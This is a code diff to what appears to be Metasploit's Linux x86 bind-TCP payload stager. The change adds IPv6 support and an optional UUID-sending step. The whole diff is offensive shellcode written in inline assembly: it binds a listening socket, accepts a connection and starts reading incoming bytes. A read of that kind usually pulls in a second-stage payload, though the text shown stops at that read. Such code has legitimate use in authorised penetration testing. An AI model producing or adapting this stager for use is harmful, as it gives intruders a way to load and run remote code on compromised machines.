@@ -2,6 +2,7 @@
 
 require 'msf/core'
 require 'msf/core/payload/transport_config'
+require 'msf/core/payload/linux/send_uuid'
 
 module Msf
 
@@ -17,6 +18,7 @@ module Payload::Linux::BindTcp
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Linux
+  include Msf::Payload::Linux::SendUUID
 
   #
   # Generate the first stage
@@ -34,6 +36,18 @@ module Payload::Linux::BindTcp
     end
 
     generate_bind_tcp(conf)
+  end
+
+  #
+  # By default, we don't want to send the UUID, but we'll send
+  # for certain payloads if requested.
+  #
+  def include_send_uuid
+    false
+  end
+
+  def use_ipv6
+    false
   end
 
   #
@@ -72,7 +86,13 @@ module Payload::Linux::BindTcp
   def asm_bind_tcp(opts={})
 
     #reliable     = opts[:reliable]
-    encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
+    af_inet = 2
+
+    if use_ipv6
+      af_inet = 0xa
+    end
+
+    encoded_port = "0x%.8x" % [opts[:port].to_i, af_inet].pack("vn").unpack("N").first
 
     asm = %Q^
       bind_tcp:
@@ -89,7 +109,7 @@ module Payload::Linux::BindTcp
         push ebx                      ; PROTO
         inc ebx                       ; SYS_SOCKET and SOCK_STREAM
         push ebx
-        push 0x2                      ; SYS_BIND and AF_INET
+        push #{af_inet}               ; SYS_BIND and AF_INET(6)
         mov ecx,esp
         mov al,0x66                   ; socketcall syscall
         int 0x80                      ; invoke socketcall (SYS_SOCKET)
@@ -114,15 +134,38 @@ module Payload::Linux::BindTcp
 
         pop ebx
         pop esi
+    ^
+
+    if use_ipv6
+      asm << %Q^
+        push 2
+        pop ebx
+        push edx
+        push edx
+        push edx
+        push edx
+        push edx
+        push edx
+        push #{encoded_port}
+        mov ecx,esp
+        push 0x1c
+      ^
+    else
+      asm << %Q^
         push edx
         push #{encoded_port}
         push 0x10
+      ^
+    end
+
+    asm << %Q^
         push ecx
         push eax
         mov ecx,esp
         push 0x66                     ; socketcall syscall
         pop eax
         int 0x80                      ; invoke socketcall (SYS_BIND)
+
         shl ebx,1                     ; SYS_LISTEN
         mov al,0x66                   ; socketcall syscall (SYS_LISTEN)
         int 0x80                      ; invoke socketcall
@@ -133,6 +176,16 @@ module Payload::Linux::BindTcp
         mov [ecx+0x4],edx
         int 0x80                      ; invoke socketcall (SYS_ACCEPT)
         xchg eax,ebx
+    ^
+
+    if include_send_uuid
+      asm << %Q^
+        mov edi, ebx
+        #{asm_send_uuid}
+      ^
+    end
+
+    asm << %Q^
         mov dh,0xc                    ; at least 0x0c00 bytes
         mov al,0x3                    ; read syscall
         int 0x80                      ; invoke read
